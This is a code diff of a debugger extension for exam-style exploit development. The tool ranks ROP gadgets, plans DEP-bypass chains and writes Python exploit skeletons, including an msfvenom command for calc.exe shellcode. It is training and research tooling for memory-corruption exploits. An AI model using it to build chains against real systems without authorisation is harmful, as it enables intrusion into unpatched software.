@@ -4186,6 +4186,41 @@ var osed_bundle = (() => {
     existing.push(gadget);
     map.set(k, existing);
   }
+  var WRITES_FIRST = [
+    "mov",
+    "movzx",
+    "movsx",
+    "lea",
+    "xor",
+    "or",
+    "and",
+    "add",
+    "sub",
+    "adc",
+    "sbb",
+    "inc",
+    "dec",
+    "neg",
+    "not",
+    "imul",
+    "shl",
+    "shr",
+    "sar",
+    "rol",
+    "ror",
+    "bswap",
+    "pop"
+  ];
+  function overwrites(instruction, register2) {
+    const operands = instruction.operands.map((operand) => operand.trim().toLowerCase());
+    if (instruction.mnemonic === "xchg") return operands.indexOf(register2) >= 0;
+    return WRITES_FIRST.indexOf(instruction.mnemonic) >= 0 && operands[0] === register2;
+  }
+  function spoilsOwnInput(gadget, evidence, register2) {
+    const at = gadget.instructions.findIndex((instruction) => instruction.normalizedText === evidence);
+    if (at <= 0) return false;
+    return gadget.instructions.slice(0, at).some((instruction) => overwrites(instruction, register2));
+  }
   function buildCapabilities(gadgets) {
     const capabilityMap = /* @__PURE__ */ new Map();
     for (const gadget of gadgets) {
@@ -5184,6 +5219,11 @@ var osed_bundle = (() => {
     });
     return selectBest(pureXorRet, preserve);
   }
+  function operationEvidence(gadget, kind, register2, target) {
+    var _a2;
+    const capability2 = gadget.capabilities.find((candidate) => candidate.kind === kind && candidate.register === register2 && (target === void 0 || candidate.targetRegister === target));
+    return (_a2 = capability2 == null ? void 0 : capability2.evidence[0]) != null ? _a2 : "";
+  }
   function findUnaryGadget(index, kind, reg, preserve) {
     var _a2;
     const candidates2 = (_a2 = index.capabilityMap.get(capKey(kind, reg))) != null ? _a2 : [];
@@ -5191,6 +5231,7 @@ var osed_bundle = (() => {
     const valid = candidates2.filter((g) => {
       const last = g.instructions[g.instructions.length - 1];
       if ((last == null ? void 0 : last.mnemonic) !== "ret") return false;
+      if (spoilsOwnInput(g, operationEvidence(g, kind, reg), reg)) return false;
       return expected === void 0 || registerFinalWriteMnemonic(g, reg) === expected;
     });
     return selectBest(valid, preserve);
@@ -5202,6 +5243,7 @@ var osed_bundle = (() => {
     const valid = candidates2.filter((g) => {
       const last = g.instructions[g.instructions.length - 1];
       if ((last == null ? void 0 : last.mnemonic) !== "ret") return false;
+      if (spoilsOwnInput(g, operationEvidence(g, kind, dst, src), dst)) return false;
       return expected === void 0 || registerFinalWriteMnemonic(g, dst) === expected;
     });
     return selectBest(valid, preserve);
@@ -11650,10 +11692,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-22T12:37:39.751Z" : globalThis[key2];
+        value = true ? "2026-11-22T13:09:58.121Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "f2b0315592a7" : globalThis[key2];
+        value = true ? "3fc3f30358e4" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -13674,8 +13716,8 @@ var osed_bundle = (() => {
   function jobCapability(gadget, job) {
     return gadget.capabilities.find((capability2) => job.capabilities.includes(capability2.kind) && (job.register === void 0 || capability2.register === job.register) && capability2.register !== "esp");
   }
-  function ranked(index, job) {
-    return rankCandidates(index.gadgets.filter((gadget) => jobCapability(gadget, job) !== void 0 && (job.key === "pivot" || !movesEsp(gadget))));
+  function ranked(index, job, exclude) {
+    return rankCandidates(index.gadgets.filter((gadget) => jobCapability(gadget, job) !== void 0 && (job.key === "pivot" || !movesEsp(gadget)) && exclude.indexOf(gadgetAddress(gadget)) < 0));
   }
   var REGISTER = /^e(ax|bx|cx|dx|si|di|bp|sp)$/;
   function memoryBase(text) {
@@ -13730,8 +13772,20 @@ var osed_bundle = (() => {
     const transform = transforms[dest];
     return transform !== void 0 && transform.kind === "affine" && transform.base === source && ((_a2 = transform.offset) == null ? void 0 : _a2.kind) === "constant" && transform.offset.value === 0;
   }
+  var POINTER_ROLES = ["pointer", "field"];
+  function dereferencedRegisters(gadget, own) {
+    const found = [];
+    for (const instruction of gadget.instructions) {
+      if (instruction.normalizedText === own || instruction.mnemonic === "push" || instruction.mnemonic === "pop") continue;
+      for (const operand of instruction.operands) {
+        const { base } = memoryBase(operand);
+        if (base && base !== "esp" && found.indexOf(base) < 0) found.push(base);
+      }
+    }
+    return found;
+  }
   function rejection(gadget, job, at, live, bound) {
-    var _a2, _b;
+    var _a2, _b, _c, _d;
     const capability2 = jobCapability(gadget, job);
     if (job.key === "add") {
       if ((capability2 == null ? void 0 : capability2.kind) === "REGISTER_SUB") return "subtracts: the distance to field 1 is negative, so pop it and add";
@@ -13740,7 +13794,11 @@ var osed_bundle = (() => {
     if (job.key === "copy" && at.dest && at.source && !holds(gadget, at.dest, at.source)) return `${at.dest} does not keep the copy`;
     if (job.key === "copy" && bound.pointer !== void 0 && at.source !== bound.pointer) return `copies ${at.source}, but the captured ESP is in ${bound.pointer}`;
     if (job.key === "pivot" && !at.source) return "takes ESP from the stack, not from a register";
-    const extra = memoryWrites(gadget, (_b = capability2 == null ? void 0 : capability2.evidence[0]) != null ? _b : "");
+    const target = (_b = at.dest) != null ? _b : at.source;
+    if (target && spoilsOwnInput(gadget, (_c = capability2 == null ? void 0 : capability2.evidence[0]) != null ? _c : "", target)) {
+      return `something before it overwrites ${target}, so it works on that instead of the value you gave it`;
+    }
+    const extra = memoryWrites(gadget, (_d = capability2 == null ? void 0 : capability2.evidence[0]) != null ? _d : "");
     if (job.key !== "write" && extra.length > 0) return `also writes memory at ${extra[0]}`;
     const written = writtenRegisters(gadget);
     for (const { role, register: register2 } of live) {
@@ -13784,26 +13842,34 @@ var osed_bundle = (() => {
     }
     return out;
   }
-  function planJobs(index, style) {
+  function planJobs(index, style, exclude = []) {
     const jobs = jobsFor(style);
     const bound = {};
     return jobs.map((job, position) => {
-      var _a2;
+      var _a2, _b, _c;
       const later = liveAfter(jobs, position, true);
       const live = liveAfter(jobs, position).filter((role) => bound[role] !== void 0).map((role) => ({ role, register: bound[role] }));
-      const verdicts = (index ? ranked(index, job) : []).map((gadget) => {
+      const pointed = POINTER_ROLES.map((role) => bound[role]).filter((register2) => register2 !== void 0);
+      const verdicts = (index ? ranked(index, job, exclude) : []).map((gadget) => {
+        var _a3, _b2, _c2;
         const at = ports(gadget, job);
+        const own = (_b2 = (_a3 = jobCapability(gadget, job)) == null ? void 0 : _a3.evidence[0]) != null ? _b2 : "";
+        const leads = own !== "" && own === ((_c2 = gadget.instructions[0]) == null ? void 0 : _c2.normalizedText);
+        const controlled = [...pointed, at.address].filter((register2) => register2 !== void 0);
+        const uncontrolled = dereferencedRegisters(gadget, own).filter((register2) => controlled.indexOf(register2) < 0);
+        const note = uncontrolled.length > 0 ? `; reads through ${uncontrolled.join(", ")}, which nothing in the chain has pointed anywhere yet` : "";
         const rejected = rejection(gadget, job, at, live, bound);
-        if (rejected) return { gadget, at, usable: false, reason: rejected };
+        if (rejected) return { gadget, at, usable: false, uncontrolled, leads, reason: rejected };
         const needed = moves(job, at, bound);
         if (needed.length > 0) {
           const back = readsOf(job).some((role) => later.indexOf(role) >= 0) ? ", and back after" : "";
           const move = `${needed.join(", ")} first${back}`;
-          return { gadget, at, usable: true, move, reason: `move ${move}` };
+          return { gadget, at, usable: true, move, uncontrolled, leads, reason: `move ${move}${note}` };
         }
-        return { gadget, at, usable: true, reason: exactReason(gadget, job, at, live, bound) };
+        return { gadget, at, usable: true, uncontrolled, leads, reason: `${exactReason(gadget, job, at, live, bound)}${note}` };
       });
-      const pick2 = (_a2 = verdicts.filter((verdict) => verdict.usable && !verdict.move)[0]) != null ? _a2 : verdicts.filter((verdict) => verdict.usable)[0];
+      const safe = (verdict) => verdict.uncontrolled.length === 0;
+      const pick2 = (_c = (_b = (_a2 = verdicts.filter((verdict) => verdict.usable && !verdict.move && safe(verdict))[0]) != null ? _a2 : verdicts.filter((verdict) => verdict.usable && safe(verdict))[0]) != null ? _b : verdicts.filter((verdict) => verdict.usable && !verdict.move)[0]) != null ? _c : verdicts.filter((verdict) => verdict.usable)[0];
       const sets = job.flow.sets;
       if (pick2 && sets) {
         const register2 = ports(pick2.gadget, job)[sets.port];
@@ -13857,7 +13923,9 @@ var osed_bundle = (() => {
     for (const verdict of above.slice(0, 3)) lines.push(...line(verdict, " ", verdict.usable ? "usable" : "no"));
     if (above.length > 3) lines.push(`      ... and ${above.length - 3} more above it`);
     if (pick2) lines.push(...line(pick2, ">", "PICK"));
-    else lines.push(`    none of the ${verdicts.length} keeps ${live.map((entry) => entry.register).join(", ")}`);
+    if (pick2 && pick2.uncontrolled.length > 0) {
+      lines.push(`      !! every candidate for this job reads through ${pick2.uncontrolled.join(", ")}. Point ${pick2.uncontrolled.join(" and ")} at readable memory before this gadget runs, or the chain dies here.`);
+    } else lines.push(`    none of the ${verdicts.length} keeps ${live.map((entry) => entry.register).join(", ")}`);
     for (const verdict of after) lines.push(...line(verdict, " ", "usable"));
     return lines;
   }
@@ -13994,7 +14062,13 @@ var osed_bundle = (() => {
   function buildExploit(input) {
     var _a2, _b, _c, _d, _e, _f, _g, _h;
     const { api, style, index, badchars } = input;
-    const gadgets = (_a2 = index == null ? void 0 : index.gadgets) != null ? _a2 : [];
+    const stages = [];
+    const nextStage = () => {
+      const number = input.stage + stages.length;
+      stages.push(number);
+      return number;
+    };
+    const gadgets = ((_a2 = index == null ? void 0 : index.gadgets) != null ? _a2 : []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
     const table2 = [];
     const holes = [];
     const recipes = [];
@@ -14004,14 +14078,36 @@ var osed_bundle = (() => {
       var _a3;
       return (_a3 = input.plans.filter((plan) => plan.job.key === key2)[0]) == null ? void 0 : _a3.pick;
     };
-    const row = (address, text, job, pops = 0, retn = 0) => {
+    const swapsFor = (address, loads) => {
+      const plan = input.plans.filter((candidate) => candidate.pick && gadgetAddress(candidate.pick.gadget) === address)[0];
+      if (!plan || !plan.pick) return [];
+      const chosen = plan.pick;
+      const sameAt = (verdict) => {
+        var _a3, _b2;
+        return verdict.at.dest === chosen.at.dest && verdict.at.source === chosen.at.source && verdict.at.address === chosen.at.address && ((_a3 = verdict.at.offset) != null ? _a3 : 0) === ((_b2 = chosen.at.offset) != null ? _b2 : 0);
+      };
+      return plan.verdicts.slice(plan.verdicts.indexOf(chosen) + 1).filter((verdict) => verdict.usable && !verdict.move && verdict.uncontrolled.length === 0 && verdict.leads && chosen.leads && sameAt(verdict) && input.exclude.indexOf(gadgetAddress(verdict.gadget)) < 0).slice(0, 2).map((verdict) => ({
+        address: gadgetAddress(verdict.gadget),
+        sequence: sequence(verdict.gadget),
+        pops: extraPops(verdict.gadget, loads),
+        retn: lastRetN(verdict.gadget),
+        why: sideEffects(verdict.gadget, plan.job)
+      }));
+    };
+    const warnings = {};
+    for (const plan of input.plans) {
+      if (plan.pick && plan.pick.uncontrolled.length > 0) {
+        warnings[gadgetAddress(plan.pick.gadget)] = `reads through ${plan.pick.uncontrolled.join(", ")}, which nothing points anywhere: set ${plan.pick.uncontrolled.join(" and ")} first or it faults here`;
+      }
+    }
+    const row = (address, text, job, pops = 0, retn = 0, loads = 0) => {
       const found = table2.filter((entry3) => entry3.address === address)[0];
       if (found) return found;
-      const entry2 = { name: "", address, sequence: text, pops, retn, job };
+      const entry2 = { name: "", address, sequence: text, pops, retn, job, loads };
       table2.push(entry2);
       return entry2;
     };
-    const entry = (gadget, job, loads = 0) => row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, loads), lastRetN(gadget));
+    const entry = (gadget, job, loads = 0) => row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, loads), lastRetN(gadget), loads);
     const refs = [];
     const ref = (target) => `${refs.push(target) - 1}`;
     const hole = (target, how) => {
@@ -14048,7 +14144,10 @@ var osed_bundle = (() => {
           if (!JUNK.test(recipe.steps[j].comment)) values.push(hex5((_a3 = recipe.steps[j].value) != null ? _a3 : 0));
         }
         const gadget = byAddress[Number(step.address)];
-        ops.push({ call: gadget ? entry(gadget, job, values.length) : row(Number(step.address), step.comment, job), values });
+        ops.push({
+          call: gadget ? entry(gadget, job, values.length) : row(Number(step.address), `${step.comment}   <<< not in the scanned corpus: check its extra pops and ret N by hand`, job),
+          values
+        });
       });
       return ops;
     };
@@ -14294,6 +14393,7 @@ var osed_bundle = (() => {
     const slot = slotBlock(api, input.module, input.iatSlot, badchars);
     return {
       table: table2,
+      stages,
       holes: slot.hole ? [slot.hole, ...holes] : holes,
       recipes,
       blocks: {
@@ -14301,8 +14401,14 @@ var osed_bundle = (() => {
         2: slot.block,
         3: CORPUS_BLOCK,
         4: { lines: [
-          ...table2.map((entry2) => `${entry2.name.padEnd(width)} = ${hex5(entry2.address)}   # ${entry2.sequence}`),
-          `COST = {${cost.map((entry2) => `${entry2.name}: (${entry2.pops}, ${entry2.retn ? `0x${entry2.retn.toString(16)}` : 0})`).join(", ")}}     # (extra pops, ret N)`,
+          ...table2.flatMap((entry2) => [
+            `${entry2.name.padEnd(width)} = ${hex5(entry2.address)}   # ${entry2.sequence}${warnings[entry2.address] ? `   <<< ${warnings[entry2.address]}` : ""}`,
+            ...swapsFor(entry2.address, entry2.loads).map((swap) => `# ${entry2.name.padEnd(width - 2)} = ${hex5(swap.address)}   # ${swap.sequence}   drop-in swap, ranked lower: ${swap.why}`)
+          ]),
+          `COST = {${[
+            ...cost.map((entry2) => `${entry2.name}: (${entry2.pops}, ${entry2.retn ? `0x${entry2.retn.toString(16)}` : 0})`),
+            ...table2.flatMap((entry2) => swapsFor(entry2.address, entry2.loads).filter((swap) => swap.pops > 0 || swap.retn > 0).map((swap) => `${hex5(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`))
+          ].join(", ")}}     # (extra pops, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
           "",
           "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for its extra pops",
           "    skip, patches = 0, None",
@@ -14318,13 +14424,16 @@ var osed_bundle = (() => {
         ] },
         6: { lines: frameBlock },
         7: { lines: [
-          'nops = b"\\x90" * 16',
-          ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
-          ...sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : [],
-          "c = Chain()",
-          ...render(chain, ""),
-          "return payload"
-        ].map((line) => line === "" ? "" : `    ${line}`) }
+          `def payload${nextStage()}():`,
+          ...[
+            'nops = b"\\x90" * 16',
+            ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
+            ...sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : [],
+            "c = Chain()",
+            ...render(chain, ""),
+            "return payload"
+          ].map((line) => line === "" ? "" : `    ${line}`)
+        ] }
       }
     };
   }
@@ -25170,10 +25279,10 @@ ${INDENT}`)]);
       });
       return toDxResult("Chain Verifier", rows);
     };
-    const printDepCandidates = (corpus, moduleName, badSet, style) => {
+    const printDepCandidates = (corpus, moduleName, badSet, style, exclude = []) => {
       var _a2;
       info("Ranked by fewest side effects, then the smallest stack move. The pick (>) is the first that keeps every register the chain still needs.");
-      const plans = planJobs(corpus, style);
+      const plans = planJobs(corpus, style, exclude);
       for (const plan of plans) {
         for (const line of planLines(plan)) print(line);
       }
@@ -25232,25 +25341,30 @@ ${INDENT}`)]);
       if (args.length === 1 && args[0] === "help") {
         return helperHelp("dep_plan");
       }
-      section(dxCall("dep_plan", args));
-      const [apiArg, moduleArg, badArg, styleArg] = args;
+      const [apiArg, moduleArg, badArg, styleArg, stageArg, excludeArg] = args;
       const depApi = DEP_PLAN_APIS.find((name) => name.toLowerCase() === String(apiArg != null ? apiArg : "").trim().toLowerCase());
       const style = String(styleArg != null ? styleArg : "skeleton").trim().toLowerCase();
+      const stage = stageArg === void 0 ? 1 : Math.trunc(Number(stageArg));
+      const excludeText = typeof excludeArg === "string" ? excludeArg.trim() : "";
+      const exclude = excludeText ? excludeText.split(/[\s,]+/).map((token) => parseInt(token.replace(/^0x/i, ""), 16) >>> 0) : [];
       const moduleName = typeof moduleArg === "string" ? moduleArg.trim() : "";
       const badText = typeof badArg === "string" ? badArg : "";
       const badchars = parseHexByteList(badText);
       const fail3 = (message) => {
         const rows = [{ Error: message }];
         renderRows("DEP Plan", rows);
-        info("Usage: dx @$osed().dep_plan(api, module, badchars, style?)");
+        info("Usage: dx @$osed().dep_plan(api, module, badchars, style?, firstStage?)");
         setResult({ command: "dep_plan", args: { api: apiArg, module: moduleArg, badchars: badArg, style: styleArg }, success: false, findings: [], warnings: [], errors: [message] });
         return toDxResult("DEP Plan", rows);
       };
       if (!depApi) return fail3(`api must be one of ${DEP_PLAN_APIS.join(", ")}.`);
       if (!DEP_PLAN_STYLES.includes(style)) return fail3(`style must be one of ${DEP_PLAN_STYLES.join(", ")}.`);
+      if (!Number.isFinite(stage) || stage < 1) return fail3("firstStage must be the number of the next free payloadN() in your file, 1 or more.");
+      if (exclude.some((address) => !Number.isFinite(address) || address === 0)) return fail3('exclude must be gadget addresses in hex, such as "6A42F3CD 6A411118".');
       if (!Array.isArray(badchars)) return fail3('badchars must be hex bytes such as "00 0A 0D".');
       const moduleInfo = moduleName ? moduleInfoByName(moduleName) : void 0;
       if (!moduleInfo) return fail3(`Module "${moduleName}" is not loaded. dx @$osed().modules() lists the loaded modules.`);
+      section(dxCall("dep_plan", excludeText ? [depApi, moduleName, badText, style, stage, excludeText] : [depApi, moduleName, badText, style, stage]));
       const badSet = new Set(badchars);
       const n = DEP_PLAN_SECTIONS;
       const summary = [];
@@ -25270,13 +25384,20 @@ ${INDENT}`)]);
         return (_a3 = name.split("\\").pop()) != null ? _a3 : name;
       };
       const moduleLabel2 = shortName(moduleInfo.name);
-      const stop = (what, next) => {
+      const stop = (what, ...next) => {
         if (blocker) return;
         blocker = { what, next };
         section(`STOP: no ${depApi} chain from ${moduleLabel2}`);
         error(what);
-        error(`Next: ${next}`);
+        for (const line of next) error(line);
       };
+      const addressElsewhere = (first2) => [
+        `Keep ${depApi} and change where its address comes from, in this order:`,
+        `  1. ${first2}`,
+        `  2. dx @$osed().sc.iat_find("GetProcAddress")    if that is imported, resolve ${depApi} at run time instead of reading a slot of its own.`,
+        `  3. A fixed delta from a neighbouring kernel32 import, worked out once and written into the exploit. Any Windows update moves it, so this is the last resort.`,
+        `Only if you are free to choose the API: dx @$osed().rop.generate("auto", "", "${badText}", "${moduleName}")    scores the six bypass APIs by slot and bad chars.`
+      ];
       const first = Number(moduleInfo.base);
       const last = Number(moduleInfo.base + moduleInfo.size - BigInt(1));
       const fixedByte = (shift) => (first >>> shift & 255) === (last >>> shift & 255) ? first >>> shift & 255 : void 0;
@@ -25286,7 +25407,7 @@ ${INDENT}`)]);
       const sharedBad = [...new Set([24, 16].map(fixedByte).filter((byte) => byte !== void 0 && badSet.has(byte)))];
       const moduleWarnings = [
         moduleInfo.aslr === "enabled" ? `${moduleLabel2} has ASLR: its addresses change on every run, so a chain built from it needs a leak.` : void 0,
-        moduleInfo.preferredBase !== BigInt(0) && moduleInfo.base !== moduleInfo.preferredBase ? `${moduleLabel2} was relocated from its preferred base ${hex325(Number(moduleInfo.preferredBase))}.` : void 0,
+        moduleInfo.preferredBase !== BigInt(0) && moduleInfo.base !== moduleInfo.preferredBase ? `${moduleLabel2} is loaded at ${hex325(first)}, not at its preferred base ${hex325(Number(moduleInfo.preferredBase))}. Without ASLR it stays there for this boot, but every address below is this process's: never take one from the file on disk.` : void 0,
         sharedBad.length > 0 ? `Every address in ${moduleLabel2} (${hex325(first)} to ${hex325(last)}) holds the bad byte(s) ${sharedBad.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ")}, so no gadget from it is usable.` : void 0
       ].filter((warning) => warning !== void 0);
       for (const warning of moduleWarnings) warn(warning);
@@ -25294,8 +25415,8 @@ ${INDENT}`)]);
       printBlock(HELPER_BLOCK);
       if (moduleInfo.aslr === "enabled") {
         stop(
-          `${moduleLabel2} has ASLR: every gadget address in it moves on each run, so no chain built from it survives a reboot. This is the one case where you change module.`,
-          `dx @$osed().modules()    pick one with ASLR disabled and run dep_plan again with it`
+          `${moduleLabel2} has ASLR: every gadget address in it moves on each run, so no chain built from it survives a reboot. This is the one case where you change module, and the API stays as it is.`,
+          `Next: dx @$osed().modules()    pick one with ASLR disabled and run dep_plan again with it.`
         );
       }
       summary.push({ Section: `[1/${n}] module`, Result: moduleWarnings.length === 0 ? "fixed, clean base" : `${moduleWarnings.length} warning(s)` });
@@ -25319,8 +25440,8 @@ ${INDENT}`)]);
       const slotBad = iatSlot === void 0 ? [] : addressBadBytes(BigInt(iatSlot), 4, badSet);
       if (iatSlot === void 0) {
         stop(
-          `Nothing in this process imports ${depApi}, so there is no slot to read its address from. ${moduleLabel2} is not the problem here, the API is: you change API, not module.`,
-          `dx @$osed().rop.generate("auto", "", "${badText}", "${moduleName}")    scores every DEP bypass API by whether its slot exists and whether that address is free of your bad chars`
+          `No module loaded right now imports ${depApi}, so there is no slot to read its address from. This is the rare one: an exam target is normally built so the API it mandates is importable.`,
+          ...addressElsewhere(`dx @$osed().sc.iat_find("${depApi}")    run it again at the crash, when more DLLs are mapped. Any importer serves, it does not have to be ${moduleLabel2}: the IAT you read and the module your gadgets come from are independent. It only has to show ASLR disabled in modules().`)
         );
       } else {
         const owner = stripDml(String(chosen.Owner));
@@ -25328,14 +25449,14 @@ ${INDENT}`)]);
         if (!owner.toLowerCase().includes(moduleName.toLowerCase())) {
           if (ownerAslrOf(chosen)) {
             stop(
-              `${moduleLabel2} does not import ${depApi}, and every module that does has ASLR, starting with ${owner}: the slot address moves on every boot. Reading it needs a leak first, or the API resolved at run time.`,
-              `dx @$osed().sc.iat_find("${depApi}")    the Owner column lists every importer; you need one whose module shows ASLR disabled`
+              `${moduleLabel2} does not import ${depApi}, and every module that does has ASLR, starting with ${owner}: the slot address moves on every boot, so reading it needs a leak first.`,
+              ...addressElsewhere(`dx @$osed().sc.iat_find("${depApi}")    the Owner column lists every importer; you need one whose module shows ASLR disabled in modules(). It does not have to be ${moduleLabel2}: the IAT you read and the module your gadgets come from are independent.`)
             );
           } else {
             warn(`${moduleLabel2} does not import ${depApi}; this slot belongs to ${owner}. Check the other importers with sc.iat_find if you would rather stay inside one module.`);
           }
         }
-        if (slotBad.length > 0) warn(`The slot address holds bad byte(s) ${slotBad.map((b) => hex325(b).slice(-2)).join(" ")}: build it with the recipe in [5/${n}].`);
+        if (slotBad.length > 0) info(`The slot address holds the bad byte(s) ${slotBad.map((b) => hex325(b).slice(-2)).join(" ")}. That is the usual case and nothing breaks: [5/${n}] builds the address from clean constants and the chain never sends it raw.`);
         else info("The slot address has no bad byte, so it can be popped as it is.");
       }
       printBlock(slotBlock(depApi, moduleName, iatSlot, badchars).block);
@@ -25358,7 +25479,9 @@ ${INDENT}`)]);
       const cave = depApi === "WriteProcessMemory" ? quietly(() => pickCave(528, "EXEC")) : void 0;
       section(`[4/${n}] The gadget picked per job (${style} style)`);
       echo("dep_candidates", [moduleName, badText, style]);
-      const { plans, jmpEsp, missing } = printDepCandidates(corpus, moduleName, badSet, style);
+      if (exclude.length > 0) info(`Excluding ${exclude.length} gadget(s) by request: ${exclude.map(hex325).join(", ")}. The chain is solved again without them, so other jobs may pick differently.`);
+      const { plans, jmpEsp, missing } = printDepCandidates(corpus, moduleName, badSet, style, exclude);
+      const solvable = corpus && exclude.length > 0 ? buildCapabilities(corpus.gadgets.filter((gadget) => exclude.indexOf(gadgetAddress(gadget)) < 0)) : corpus;
       const build = buildExploit({
         api: depApi,
         style,
@@ -25370,7 +25493,9 @@ ${INDENT}`)]);
         writable,
         cave,
         jmpEsp,
-        solve: (register2, value, keep) => corpus ? solveValue(corpus, register2, value, badchars, keep, buildStableAddressPredicate()) : void 0
+        stage,
+        exclude,
+        solve: (register2, value, keep) => solvable ? solveValue(solvable, register2, value, badchars, keep, buildStableAddressPredicate()) : void 0
       });
       printBlock(build.blocks[4]);
       summary.push({ Section: `[4/${n}] candidates`, Result: missing.length === 0 ? "every job has one" : `missing ${missing.length}` });
@@ -25420,7 +25545,7 @@ ${INDENT}`)]);
       if (blocker) {
         section(`STOP: no ${depApi} chain from ${moduleLabel2}`);
         error(blocker.what);
-        error(`Next: ${blocker.next}`);
+        for (const line of blocker.next) error(line);
       }
       setResult({
         command: "dep_plan",
@@ -25428,7 +25553,7 @@ ${INDENT}`)]);
         success: blocker === void 0,
         findings: [{ api: depApi, module: moduleName, style, iatSlot, writable, cave, gadgets: gadgetCount, missing, holes: blocker ? [] : build.holes }],
         warnings: [...moduleWarnings, ...missing.length > 0 ? [`No candidate for: ${missing.join(", ")}`] : []],
-        errors: blocker ? [blocker.what, `Next: ${blocker.next}`] : []
+        errors: blocker ? [blocker.what, ...blocker.next] : []
       });
       return toDxResult("DEP Plan", summary);
     };
